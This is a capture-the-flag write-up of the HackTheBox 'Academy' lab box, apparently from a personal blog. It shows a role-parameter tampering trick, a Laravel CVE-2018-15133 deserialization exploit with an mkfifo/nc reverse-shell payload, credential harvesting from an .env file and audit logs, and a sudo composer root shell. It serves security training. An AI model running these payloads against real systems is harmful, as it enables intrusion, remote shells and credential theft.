---
title: "HackTheBox — Academy Writeup"
date: 2021-03-03 12:30:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, academy, ctf, php, laravel, vhost, ffuf, CVE-2018-15133, unserialize, deserialization, metasploit, password-reuse, adm, hex, logs, audit, aureport, gtfobins, composer ]
image: /assets/img/Posts/Academy.png
---

> Academy is a vulnerable replica of a recently released Cyber Security training product by HackTheBox. Initial foothold requires us to exploit a vulnerable registration page through which we can register an admin account where we get access to Task dashboard. There we discover a new virtual host, which discloses a Laravel crash report with configuration details dump including APP_KEY. Leveraging this APP_KEY we create a serialized payload to be submitted in an HTTP header leading to code execution. Later we discover creds for the next user inside another Laravel configuration file, then analyse some audit logs where we find creds for another user, and lastly elevate privileges to root using sudo composer.

## Reconnaissance

Starting off with `masscan` and `nmap` we discover three TCP open ports 22, 80, 33060

#### masscan

```shell
cfx:  ~/Documents/htb/academy
→ masscan -e tun0 -p1-65535,U:1-65535 --rate 500 10.10.10.215

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-08 13:29:57 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.215
Discovered open port 80/tcp on 10.10.10.215
Discovered open port 33060/tcp on 10.10.10.215
```

#### nmap

```shell
cfx:  ~/Documents/htb/academy
→ nmap -sC -sV -p22,80,33060 10.10.10.215
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 19:07 IST
Nmap scan report for academy.htb (10.10.10.215)
Host is up (0.077s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Hack The Box Academy
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=11/8%Time=5FA7F4B1%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
[..SNIP..]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.44 seconds
```

Port Scan Summary :

- Port 22 - SSH
- Port 80 - HTTP Website
- Port 33060 - Node.js X DevAPI's default port

### Port 33060 - MySQLx

Port 3306 defaults to the classic MySQL Wire Protocol. The MySQL X DevAPI Connector for Node.js only supports the X Protocol, which is implemented by the X Plugin (by default on port 33060). Since we are unsure how this port can be helpful, we'll leave it as it is.

### Port 80 - HTTP

Visiting <http://10.10.10.215> we see it's redirected to <http://academy.htb>

```shell
cfx:  ~/Documents/htb/academy
→ curl -v http://10.10.10.215
*   Trying 10.10.10.215:80...
* Connected to 10.10.10.215 (10.10.10.215) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.215
> User-Agent: curl/7.72.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Sun, 08 Nov 2020 17:23:45 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Location: http://academy.htb/
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host 10.10.10.215 left intact
```

After adding `academy.htb` to `/etc/hosts` file and again visiting <http://academy.htb> :

![website](/assets/img/Posts/Academy/website.png)

Using the `REGISTER` option <http://academy.htb/register.php> we are able to register a account and `LOGIN` <http://academy.htb/login.php> to it.

![login](/assets/img/Posts/Academy/login.png)

Apparently the account is static coded, no matter what account we register we end up logged in as egre55. The homepage looks like a replica of HTB Academy except with all the dead links.

#### Directory Fuzzing

```shell
cfx:  ~/Documents/htb/academy
→ ffuf -c -r -u http://academy.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -e .txt,.php -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://academy.htb/FUZZ
 :: Extensions       : .txt .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

login.php               [Status: 200, Size: 2627, Words: 667, Lines: 142]
admin.php               [Status: 200, Size: 2633, Words: 668, Lines: 142]
index.php               [Status: 200, Size: 2117, Words: 890, Lines: 77]
register.php            [Status: 200, Size: 3003, Words: 801, Lines: 149]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
home.php                [Status: 200, Size: 2627, Words: 667, Lines: 142]
.                       [Status: 200, Size: 2117, Words: 890, Lines: 77]
:: Progress: [129009/129009] :: Job [1/1] :: 484 req/sec :: Duration: [0:04:26] :: Errors: 0 ::
```

All the pages seems familiar except `admin.php`, Visiting <http://academy.htb/admin.php> we get presented with a similar login page but the credentials we registered don't work.

## Shell as www-data

### Admin Registration

Going back to the registration page and intercepting the request, we see some interesting parameters:

```shell
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://academy.htb
Connection: close
Referer: http://academy.htb/register.php
Cookie: PHPSESSID=83vimjm1h2ri1ob61tvlbbcir7; ajs_anonymous_id=%224b008a76-ac77-44e2-9dd4-14d11c35358d%22; _fbp=fb.1.1604844176006.402584810
Upgrade-Insecure-Requests: 1

uid=cfx&password=cfx&confirm=cfx&roleid=0
```

`uid` seems to represent username along with password and confirmation parameter. `roleid` is something unusual.

Next we register a new account, except this time we intercept the request with Burp and change the `roleid` value to 1, and forward the request:

```shell
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://academy.htb
Connection: close
Referer: http://academy.htb/register.php
Cookie: PHPSESSID=83vimjm1h2ri1ob61tvlbbcir7; ajs_anonymous_id=%224b008a76-ac77-44e2-9dd4-14d11c35358d%22; _fbp=fb.1.1604844176006.402584810
Upgrade-Insecure-Requests: 1

uid=cold&password=cfx&confirm=cfx&roleid=1
```

Bingo ! The new account allows us to Admin log in at <http://academy.htb/admin.php> , once logged in we see a banner `Academy Launch Planner` :

![admin](/assets/img/Posts/Academy/admin.png)

Seems like a TODO list, the last item gives us a new subdomain `dev-staging-01.academy.htb`

### Laravel Exploitation

Adding the new subdomain to `/etc/hosts` and visiting <http://dev-staging-01.academy.htb> presents us with a page full of debugging errors:

![dev](/assets/img/Posts/Academy/dev.png)

Looking at the error logs we understand it's using Laravel framework.

#### CVE-2018-15133

Searching for Laravel RCE we come across certain [**articles**](https://attackerkb.com/topics/G95JpYDkEZ/laravel-framework-unserialize-token-rce-cve-2018-15133) and a Metasploit [**exploit**](https://www.rapid7.com/db/modules/exploit/unix/http/laravel_token_unserialize_exec/) . It turns there is deserialization vulnerability in HTTP X-XSRF-TOKEN header, Surprisingly to exploit this vulnerability we require `Laravel APP_KEY`

Luckily we do have this `APP_KEY` value leaked in the crash report:

![app](/assets/img/Posts/Academy/app.png)

`"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="`

### Method 1 - MSF

Setting up the Metasploit exploit:

```shell
msf5 exploit(unix/http/laravel_token_unserialize_exec) > show options

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting                               Required  Description
   ----       ---------------                               --------  -----------
   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file
   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.215                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                            yes       The target port (TCP)
   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                                             yes       Path to target webapp
   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.6       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Firing the exploit:

```shell
msf5 exploit(unix/http/laravel_token_unserialize_exec) > run

[*] Started reverse TCP handler on 10.10.14.6:4444
[*] Command shell session 1 opened (10.10.14.6:4444 -> 10.10.10.215:60468) at 2020-11-10 11:21:19 +0530

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Method 2 - Manually

Initially when I solved this box, I had some trouble with my MSF so instead I did it manually with reference to this [**POC**](https://github.com/kozmic/laravel-poc-CVE-2018-15133) and clone it to my directory

- APP_KEY = dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=

- Step 1:  Generate unserialize payload:

To do this we need `phpggc` which can be clone from this [**Github Repo**](https://github.com/ambionics/phpggc) and using Laravel `RCE1` and `-b` flag to base64 encode the payload as specified in POC

```shell
cfx:  ~/Documents/htb/academy/phpggc  |master ✓|
→ ./phpggc Laravel/RCE1 system 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.67 8020 >/tmp/f' -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjc4OiJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC42NyA4MDIwID4vdG1wL2YiO30=
```

- Step 2: Encrypting payload with APP_KEY to generate X-XSRF-TOKEN:

```shell
cfx:  ~/Documents/htb/academy/laravel-poc-CVE-2018-15133  |master ✓|
→ ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjc4OiJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC42NyA4MDIwID4vdG1wL2YiO30=
PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic

HTTP header for POST request:
X-XSRF-TOKEN: eyJpdiI6IjNDZ1ZxRitWQndDcDRCSFAxeVVHbGc9PSIsInZhbHVlIjoiOUEyeFRLQlZ2dmhtTldUUGdqZm5ZVmozOHZ1Zm5sbTg4VjBUZFViN1djOVRTcFlZekZRM1wvWnJDdkp3TEVxeUREdUdmWTh6T2dtdHNpanZya0pTRjZmRmZUSEU1VEtLT0xERk96OHN2VnUzS3ZENmt0N3FTaWZUdktXTXRSSFZBOGZORjU1OEhhZnRpRVNJbUdPcmlxZWkzRmdMVEJhd1N1Z0NZZURDbTZqZWxqdSsxcmJJU3RFVWxxV0xYVXJJSW5YSmxzbEwzXC94QzNNOGpWT1U1TEt5VzYzUGU0N0NOUE10OHZISHNhNWhGVk1DNXN0dG92RXQxaUsxOUFcLyt0eHdKMGlUK3N3bjVIcFFkdnNPSkVIem9EQzdqOEpWaVdYcnN2bFlBVzdLZnJxcUZxMTFyQ1RRWjgxXC90UEw2RzRQUU1HQVlXN3ZvOEM2WWhUY29wWVhIUT09IiwibWFjIjoiZTA5YzgzMGYzNTRiMTg5YzBkNWMyOGRmMTU0Nzg3NGY2YjU5YTMyMDhhZmVmYjRhMWM2NTNiOGQ4NTg1MDA2MiJ9
```

- Step 3: Sending Payload with Curl:

```shell
cfx:  ~/Documents/htb/academy
→ curl http://dev-staging-01.academy.htb/ -X POST -H 'X-XSRF-TOKEN:eyJpdiI6IjNDZ1ZxRitWQndDcDRCSFAxeVVHbGc9PSIsInZhbHVlIjoiOUEyeFRLQlZ2dmhtTldUUGdqZm5ZVmozOHZ1Zm5sbTg4VjBUZFViN1djOVRTcFlZekZRM1wvWnJDdkp3TEVxeUREdUdmWTh6T2dtdHNpanZya0pTRjZmRmZUSEU1VEtLT0xERk96OHN2VnUzS3ZENmt0N3FTaWZUdktXTXRSSFZBOGZORjU1OEhhZnRpRVNJbUdPcmlxZWkzRmdMVEJhd1N1Z0NZZURDbTZqZWxqdSsxcmJJU3RFVWxxV0xYVXJJSW5YSmxzbEwzXC94QzNNOGpWT1U1TEt5VzYzUGU0N0NOUE10OHZISHNhNWhGVk1DNXN0dG92RXQxaUsxOUFcLyt0eHdKMGlUK3N3bjVIcFFkdnNPSkVIem9EQzdqOEpWaVdYcnN2bFlBVzdLZnJxcUZxMTFyQ1RRWjgxXC90UEw2RzRQUU1HQVlXN3ZvOEM2WWhUY29wWVhIUT09IiwibWFjIjoiZTA5YzgzMGYzNTRiMTg5YzBkNWMyOGRmMTU0Nzg3NGY2YjU5YTMyMDhhZmVmYjRhMWM2NTNiOGQ4NTg1MDA2MiJ9'
```

Voila! Getting a call back on `nc` listener:

```shell
cfx:  ~/Documents/htb/academy
→ nc -lvnp 8020
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8020
Ncat: Listening on 0.0.0.0:8020
Ncat: Connection from 10.10.10.215.
Ncat: Connection from 10.10.10.215:40824.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrading to full TTY:

```shell
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@academy:/var/www/html/htb-academy-dev-01/public$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Elevating www-data -> cry0l1t3

### Enumeration

It appears there quite some users on the box:

```shell
www-data@academy:/$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[..SNIP..]
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh

www-data@academy:/home$ ls
21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
```

User.txt is located inside home directory of cry0l1t3 which makes it our next go to user

```shell
www-data@academy:/home$ find . -name user.txt 2>/dev/null

./cry0l1t3/user.txt
```

### Password Discovery

The environment dump we saw in dev-staging-01.academy.htb error logs can also be found inside `www-data@academy:/var/www/html/htb-academy-dev-01` similar to this env file, we discover another env database file inside `/var/www/html/academy` which contains configuration information along with database connection details:

```shell
www-data@academy:/var/www/html/academy$ cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

```

We find `mySup3rP4s5w0rd!!` which turns out to be cry0l1t3's password.

### su - cry0l1t3

```shell
www-data@academy:/$ su cry0l1t3
Password: mySup3rP4s5w0rd!!

$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
$ whoami
cry0l1t3
```

We can even SSH to the user:

```shell
fx:  ~/Documents/htb/academy
→ ssh cry0l1t3@10.10.10.215
cry0l1t3@10.10.10.215's password:
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 12 Nov 2020 12:10:26 PM UTC

  System load:             0.0
  Usage of /:              44.6% of 15.68GB
  Memory usage:            17%
  Swap usage:              0%
  Processes:               179
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.215
  IPv6 address for ens160: dead:beef::250:56ff:feb9:d933


0 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Nov 12 11:43:53 2020 from 10.10.14.20
$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

Grabbing user.txt:

```shell
$ bash
cry0l1t3@academy:~$ cat user.txt
c3d927d8105ef6******************
```

## Elevating cry0l1t3 -> mrb3n

### Enumeration

User cry0l1t3 is a member of adm group:

```shell
cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```
> Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.

### Log Analysis

So while going through the audit logs, I came across this [**redhat doc**](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-audit_record_types) which gives us an insight of type of audit logs.

We see an entry for TTY type:

- TTY : Triggered when TTY input was sent to an administrative process.

Hence TTY type was captured when some administrative process was triggered, Grepping recursively for TTY we see the following output:

```shell
cry0l1t3@academy:/var/log/audit$ grep -r TTY
audit.log.3:type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A
audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
audit.log.3:type=TTY msg=audit(1597199304.778:89): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm="sh" data=77686F616D690A
audit.log.3:type=TTY msg=audit(1597199308.262:90): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A
audit.log.3:type=TTY msg=audit(1597199317.622:93): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=2F62696E2F62617368202D690A
audit.log.3:type=TTY msg=audit(1597199443.421:94): tty pid=2606 uid=1002 auid=0 ses=1 major=4 minor=1 comm="nano" data=1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D

[..SNIP..]
```
Looking at the first log entry: `audit.log.3:type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A` It appears the user with `uid=1002` ran some command in `sh` and the command is stored in hex `7375206D7262336E0A`

> The comm field records the command-line name of the command that was used to invoke the analysed process.

We can decode it:

```shell
cry0l1t3@academy:/var/log/audit$ echo '7375206D7262336E0A' | xxd -r -p
su mrb3n
```

Onto the next entry `audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A`

Here `comm="su"` appears to be command and data is `6D7262336E5F41634064336D79210A` which is in hex format.

Decoding the command value:

```shell
cry0l1t3@academy:/var/log/audit$ echo '6D7262336E5F41634064336D79210A' | xxd -r -p
mrb3n_Ac@d3my!
```

### su - mrb3n

Appears to be the password used for `su mrb3n` command, we can su with this:

```shell
cry0l1t3@academy:~$ su mrb3n
Password:
$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
```

Alternatively log analysis could also be achieved using a tool called `aureport` using the option `--tty` which shows TTY keystrokes, turns out it also shows password in clear text:

```shell
cry0l1t3@academy:~$ aureport --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
6. 08/12/2020 02:30:43 94 0 ? 1 nano <delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
7. 08/12/2020 02:32:13 95 0 ? 1 nano <down>,<up>,<up>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<backspace>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
8. 08/12/2020 02:32:55 96 0 ? 1 nano "6",<^X>,"y",<ret>
9. 08/12/2020 02:33:26 97 0 ? 1 bash "ca",<up>,<up>,<up>,<backspace>,<backspace>,"cat au",<tab>,"| grep data=",<ret>,"cat au",<tab>,"| cut -f11 -d\" \"",<ret>,<up>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<right>,<right>,"grep data= | ",<ret>,<up>," > /tmp/data.txt",<ret>,"id",<ret>,"cd /tmp",<ret>,"ls",<ret>,"nano d",<tab>,<ret>,"cat d",<tab>," | xx",<tab>,"-r -p",<ret>,"ma",<backspace>,<backspace>,<backspace>,"nano d",<tab>,<ret>,"cat dat",<tab>," | xxd -r p",<ret>,<up>,<left>,"-",<ret>,"cat /var/log/au",<tab>,"t",<tab>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,"d",<tab>,"aud",<tab>,"| grep data=",<ret>,<up>,<up>,<up>,<up>,<up>,<down>,<ret>,<up>,<up>,<up>,<ret>,<up>,<up>,<up>,<ret>,"exit",<backspace>,<backspace>,<backspace>,<backspace>,"history",<ret>,"exit",<ret>
10. 08/12/2020 02:33:26 98 0 ? 1 sh "exit",<nl>
11. 08/12/2020 02:33:30 107 0 ? 1 sh "/bin/bash -i",<nl>
12. 08/12/2020 02:33:36 108 0 ? 1 bash "istory",<ret>,"history",<ret>,"exit",<ret>
13. 08/12/2020 02:33:36 109 0 ? 1 sh "exit",<nl>
```

Apparently, Whatever we did manually to discover `mrb3n_Ac@d3my!` password can also be done using this tool.

## Elevating mrb3n -> root

SSH to mrb3n :

```shell
cfx:  ~/Documents/htb/academy
→ ssh mrb3n@10.10.10.215
mrb3n@10.10.10.215's password:
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 08 Nov 2020 08:50:38 PM UTC

  System load:             0.65
  Usage of /:              44.4% of 15.68GB
  Memory usage:            23%
  Swap usage:              0%
  Processes:               201
  Users logged in:         1
  IPv4 address for ens160: 10.10.10.215
  IPv6 address for ens160: dead:beef::250:56ff:feb9:b323


0 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
```

### Enumeration

Exploring privileges:

```shell
mrb3n@academy:~$ sudo -l
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

Turns our mrb3n user can run composer with sudo

### root shell

Referring [**GTFO**](https://gtfobins.github.io/gtfobins/composer/) to get root shell:

```shell
mrb3n@academy:~$ TF=$(mktemp -d)
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
uid=0(root) gid=0(root) groups=0(root)

root@academy:~# cat academy.txt
██╗  ██╗████████╗██████╗      █████╗  ██████╗ █████╗ ██████╗ ███████╗███╗   ███╗██╗   ██╗
██║  ██║╚══██╔══╝██╔══██╗    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝████╗ ████║╚██╗ ██╔╝
███████║   ██║   ██████╔╝    ███████║██║     ███████║██║  ██║█████╗  ██╔████╔██║ ╚████╔╝
██╔══██║   ██║   ██╔══██╗    ██╔══██║██║     ██╔══██║██║  ██║██╔══╝  ██║╚██╔╝██║  ╚██╔╝
██║  ██║   ██║   ██████╔╝    ██║  ██║╚██████╗██║  ██║██████╔╝███████╗██║ ╚═╝ ██║   ██║
╚═╝  ╚═╝   ╚═╝   ╚═════╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝   ╚═╝

We've been hard at work.

Check out our brand new training platform, Hack the Box Academy!

https://academy.hackthebox.eu/
```

Grabbing root.txt:

```shell
# bash
root@academy:/tmp/tmp.2eB1VYtdHa# cd ~
root@academy:~# cat root.txt
c7baa2003770d4******************

```

And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
